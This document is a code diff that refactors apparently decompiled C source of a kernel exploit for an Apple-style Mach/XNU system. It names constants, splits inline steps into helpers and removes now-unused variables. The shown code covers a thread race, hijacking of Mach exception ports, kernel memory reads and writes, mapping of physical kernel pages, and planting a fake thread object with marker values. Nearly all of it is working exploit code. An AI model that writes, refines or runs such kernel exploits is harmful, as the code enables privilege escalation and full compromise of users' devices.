@@ -157,8 +157,12 @@ typedef struct VmcopyTriggerThreadBlock
 enum
 {
   VMCOPY_KREAD_CTX_OFFSET = 8,
+  VMCOPY_EXCEPTION_MSG_BUFFER_OFFSET = 16,
   VMCOPY_MAPPED_THREAD_OBJECT_OFFSET = 24,
+  VMCOPY_CHILD_THREAD_PORT_OFFSET = 40,
+  VMCOPY_FINAL_THREAD_OBJECT_OFFSET = 352,
   VMCOPY_TARGET_THREAD_KADDR_OFFSET = 360,
+  VMCOPY_EXCEPTION_PORT_OFFSET = 368,
   VMCOPY_CHILD_THREAD_KADDR_OFFSET = 376,
   VMCOPY_FAKE_THREAD_STATE_OFFSET = 384,
   VMCOPY_FAKE_THREAD_STATE_BYTES = 0x110,
@@ -177,6 +181,16 @@ enum
   VMCOPY_POLICY_MARK_DEFAULT_OFFSET = 184,
   VMCOPY_POLICY_MARK_LEGACY_CPU_OFFSET = 112,
   VMCOPY_POLICY_MARK_BIT = 0x8000,
+  VMCOPY_EXCEPTION_MASK = 0x1BFE,
+  VMCOPY_EXCEPTION_BEHAVIOR = 2,
+  VMCOPY_EXCEPTION_FLAVOR = 17,
+  VMCOPY_EXCEPTION_MSG_ALLOC_SIZE = 0x800,
+  VMCOPY_EXCEPTION_MSG_RECV_SIZE = 0x400,
+  VMCOPY_PAGE_INFO_PAYLOAD_WORDS = 30,
+  VMCOPY_FINAL_WAIT_LINK_MARKER = 0x41414141u,
+  VMCOPY_FINAL_MSG_LINK_MARKER = 0x42424242u,
+  VMCOPY_FINAL_ARG5_MARKER = 0x43434343u,
+  VMCOPY_FINAL_ARG6_MARKER = 0x44444444u,
   VMCOPY_MARKER32 = 0xC0C0C0C0u,
   VMCOPY_MARKER64 = 0xC0C0C0C0C0C0C0C0ULL,
 };
@@ -446,6 +460,41 @@ static inline uint64_t vmcopy_run_thread_state_race(
   }
 }
 
+static inline void vmcopy_receive_captured_thread_exception(__int64 state, const void *capturedThreadObject)
+{
+  __int64 kreadCtx = *(uint64_t *)(state + VMCOPY_KREAD_CTX_OFFSET);
+  uint64_t targetThreadKaddr = *(uint64_t *)(state + VMCOPY_TARGET_THREAD_KADDR_OFFSET);
+
+  kread_u64_value(kreadCtx, targetThreadKaddr + 296);
+  mach_port_allocate(mach_task_self_, 1u, (mach_port_name_t *)(state + VMCOPY_EXCEPTION_PORT_OFFSET));
+  mach_port_insert_right(
+    mach_task_self_,
+    *(uint32_t *)(state + VMCOPY_EXCEPTION_PORT_OFFSET),
+    *(uint32_t *)(state + VMCOPY_EXCEPTION_PORT_OFFSET),
+    0x14u);
+  thread_set_exception_ports(
+    *(uint32_t *)(state + VMCOPY_CAPTURED_THREAD_OFFSET),
+    VMCOPY_EXCEPTION_MASK,
+    *(uint32_t *)(state + VMCOPY_EXCEPTION_PORT_OFFSET),
+    VMCOPY_EXCEPTION_BEHAVIOR,
+    VMCOPY_EXCEPTION_FLAVOR);
+  thread_resume(*(uint32_t *)(state + VMCOPY_CAPTURED_THREAD_OFFSET));
+
+  mach_msg_header_t *message = (mach_msg_header_t *)calloc(1u, VMCOPY_EXCEPTION_MSG_ALLOC_SIZE);
+  *(uint64_t *)(state + VMCOPY_EXCEPTION_MSG_BUFFER_OFFSET) = (uint64_t)message;
+  mach_msg(
+    message,
+    VMCOPY_EXCEPTION_BEHAVIOR,
+    0,
+    VMCOPY_EXCEPTION_MSG_RECV_SIZE,
+    *(uint32_t *)(state + VMCOPY_EXCEPTION_PORT_OFFSET),
+    0,
+    0);
+
+  kread_u64_value(kreadCtx, targetThreadKaddr + 296);
+  memcpy(*(void **)(state + VMCOPY_MAPPED_THREAD_OBJECT_OFFSET), capturedThreadObject, 0x130u);
+}
+
 static inline void vmcopy_patch_memory_entry_page(__int64 kreadCtx, __int64 pageInfoKaddr, uint32_t ppnum, __int128 scratch[2])
 {
   memset(scratch, 0, 32);
@@ -470,6 +519,51 @@ static inline vm_address_t vmcopy_map_physical_page(
   vmcopy_patch_memory_entry_page(kreadCtx, pageInfoKaddr, restorePageRef, scratch);
 
   return mappedAddress;
+}
+
+static inline void vmcopy_install_final_fake_thread_object(
+        __int64 state,
+        __int64 pageInfoKaddr,
+        uint32_t mappedPageRef,
+        uint32_t restorePageRef,
+        mem_entry_name_port_t objectHandle,
+        uint64_t pageInfoPayload[VMCOPY_PAGE_INFO_PAYLOAD_WORDS])
+{
+  __int64 kreadCtx = *(uint64_t *)(state + VMCOPY_KREAD_CTX_OFFSET);
+  uint64_t targetThreadKaddr = *(uint64_t *)(state + VMCOPY_TARGET_THREAD_KADDR_OFFSET);
+  uint64_t targetThreadPage = targetThreadKaddr & 0xFFFFFFFFFFFFC000LL;
+  uint64_t targetThreadPageOffset = targetThreadKaddr & 0x3FFFLL;
+  vm_address_t mappedPage = vmcopy_map_physical_page(
+                              kreadCtx,
+                              pageInfoKaddr,
+                              mappedPageRef,
+                              restorePageRef,
+                              objectHandle,
+                              targetThreadPage,
+                              (__int128 *)pageInfoPayload);
+  uint64_t mappedThreadObject = mappedPage + targetThreadPageOffset;
+
+  *(uint64_t *)(state + VMCOPY_FINAL_THREAD_OBJECT_OFFSET) = mappedThreadObject;
+  *(uint64_t *)(mappedThreadObject + 264) = VMCOPY_FINAL_WAIT_LINK_MARKER;
+  *(uint32_t *)(mappedThreadObject + 272) = 0;
+  *(uint64_t *)(mappedThreadObject + 248) = VMCOPY_FINAL_MSG_LINK_MARKER;
+  memcpy((void *)(mappedThreadObject + 136), kVmcopyFakePageMarkers, sizeof(kVmcopyFakePageMarkers));
+  setup_kernel_exploit_msg(
+    state,
+    targetThreadKaddr,
+    VMCOPY_FINAL_WAIT_LINK_MARKER,
+    0,
+    VMCOPY_FINAL_MSG_LINK_MARKER,
+    VMCOPY_FINAL_ARG5_MARKER,
+    VMCOPY_FINAL_ARG6_MARKER);
+
+  memset(pageInfoPayload, 0, VMCOPY_PAGE_INFO_PAYLOAD_WORDS * sizeof(uint64_t));
+  query_phys_page_info(state, qword_48040, (__int64)pageInfoPayload);
+
+  uint64_t messageKaddr = *(uint64_t *)(state + VMCOPY_MESSAGE_KADDR_OFFSET);
+  kwrite_u64_to_addr(kreadCtx, messageKaddr + 61448LL, messageKaddr + 61408LL);
+  uint64_t vtableResult = (*(__int64 (__fastcall **)(__int64))(*(uint64_t *)state + 16LL))(state);
+  kwrite_u64_to_addr(kreadCtx, messageKaddr + 61456LL, vtableResult);
 }
 
 static inline uint64_t vmcopy_page_info_addr_from_ref(uint32_t ref, uint64_t packedBase, uint64_t linearBase, uint32_t pageShift)
@@ -8075,9 +8169,7 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
   __int64 v48; // x28
   int v54; // w8
   unsigned int v63; // w0
-  unsigned __int64 v64; // x22
   unsigned __int64 v65; // x25
-  unsigned __int64 v67; // x8
   __int64 v68; // x22
   __int64 v69; // x0
   unsigned __int64 v70; // x0
@@ -8088,13 +8180,6 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
   __int64 v75; // x0
   mach_vm_address_t v76; // x1
   __int64 v78; // x25
-  mach_msg_header_t *v86; // x0
-  vm_offset_t v87; // x22
-  __int64 v88; // x24
-  vm_address_t v89; // x8
-  __int64 v90; // x22
-  __int64 v91; // x24
-  __int64 v92; // x0
   void *v94; // [xsp+40h] [xbp-6C0h]
   __int64 v95; // [xsp+58h] [xbp-6A8h]
   __int64 v96; // [xsp+98h] [xbp-668h]
@@ -8111,7 +8196,6 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
   unsigned int v107; // [xsp+ECh] [xbp-614h]
   vm_offset_t v108; // [xsp+F0h] [xbp-610h]
   unsigned __int64 v109; // [xsp+F8h] [xbp-608h]
-  vm_address_t v110; // [xsp+100h] [xbp-600h] BYREF
   natural_t suspendedThreadState[0x44]; // [xsp+140h] [xbp-5C0h] BYREF
   VmcopyWritePhysmapBlock writePhysmapBlock; // [xsp+250h] [xbp-4B0h] BYREF
   vm_address_t v144; // [xsp+2B8h] [xbp-448h] BYREF
@@ -8327,10 +8411,8 @@ LABEL_68:
     kwrite_u64_to_addr(*v2, v23 + qword_48008 - 8, v100);
     kwrite_u64_to_addr(*v2, qword_48008 + v23, v96);
     v63 = kread_u32_value(*v2, v20);
-    v64 = v106;
     v65 = vmcopy_find_page_info_for_physical(*v2, v63, v109, v106, v159, v108);
-    v67 = vmcopy_page_info_ref_from_addr(v65, v109, v64, v159);
-    v99 = v67;
+    v99 = vmcopy_page_info_ref_from_addr(v65, v109, v106, v159);
     v144 = vmcopy_map_physical_page(
              *(uint64_t *)(someStruct + 8),
              v103,
@@ -8385,41 +8467,15 @@ LABEL_68:
                                   v41,
                                   v100);
     memcpy(v94, (const void *)capturedSnapshot, 0x130u);
-    kread_u64_value(*(uint64_t *)(someStruct + 8), *(uint64_t *)(someStruct + 360) + 296LL);
-    mach_port_allocate(mach_task_self_, 1u, (mach_port_name_t *)(someStruct + 368));
-    mach_port_insert_right(mach_task_self_, *(uint32_t *)(someStruct + 368), *(uint32_t *)(someStruct + 368), 0x14u);
-    thread_set_exception_ports(*(uint32_t *)(someStruct + 672), 0x1BFEu, *(uint32_t *)(someStruct + 368), 2, 17);
-    thread_resume(*(uint32_t *)(someStruct + 672));
-    v86 = (mach_msg_header_t *)calloc(1u, 0x800u);
-    *(uint64_t *)(someStruct + 16) = v86;
-    mach_msg(v86, 2, 0, 0x400u, *(uint32_t *)(someStruct + 368), 0, 0);
-    kread_u64_value(*(uint64_t *)(someStruct + 8), *(uint64_t *)(someStruct + 360) + 296LL);
-    memcpy(*(void **)(someStruct + 24), v94, 0x130u);
-    v87 = *(uint64_t *)(someStruct + 360) & 0xFFFFFFFFFFFFC000LL;
-    v88 = *(uint64_t *)(someStruct + 360) & 0x3FFFLL;
-    v110 = vmcopy_map_physical_page(
-             *(uint64_t *)(someStruct + 8),
-             v103,
-             *(uint64_t *)(someStruct + 32),
-             v102 >> v159,
-             object_handle,
-             v87,
-             (__int128 *)pageInfoPayload);
-    v89 = v110 + v88;
-    *(uint64_t *)(someStruct + 352) = v110 + v88;
-    *(uint64_t *)(v89 + 264) = 1094795585;
-    *(uint32_t *)(v89 + 272) = 0;
-    *(uint64_t *)(v89 + 248) = 1111638594;
-    memcpy((void *)(v89 + 136), kVmcopyFakePageMarkers, sizeof(kVmcopyFakePageMarkers));
-    setup_kernel_exploit_msg(someStruct, *(uint64_t *)(someStruct + 360), 1094795585, 0, 1111638594, 1128481603, 1145324612);
-    memset(pageInfoPayload, 0, sizeof(pageInfoPayload));
-    query_phys_page_info(someStruct, qword_48040, (__int64)pageInfoPayload);
-    kwrite_u64_to_addr(*(uint64_t *)(someStruct + 8), *(uint64_t *)(someStruct + 664) + 61448LL, *(uint64_t *)(someStruct + 664) + 61408LL);
-    v90 = *(uint64_t *)(someStruct + 8);
-    v91 = *(uint64_t *)(someStruct + 664) + 61456LL;
-    v92 = (*(__int64 (__fastcall **)(__int64))(*(uint64_t *)someStruct + 16LL))(someStruct);
-    kwrite_u64_to_addr(v90, v91, v92);
-    *(uint32_t *)(someStruct + 40) = v162;
+    vmcopy_receive_captured_thread_exception(someStruct, v94);
+    vmcopy_install_final_fake_thread_object(
+      someStruct,
+      v103,
+      *(uint64_t *)(someStruct + 32),
+      v102 >> v159,
+      object_handle,
+      pageInfoPayload);
+    *(uint32_t *)(someStruct + VMCOPY_CHILD_THREAD_PORT_OFFSET) = v162;
     if ( semaphore + 1 >= 2 )
       semaphore_destroy(mach_task_self_, semaphore);
     if ( v160 + 1 >= 2 )
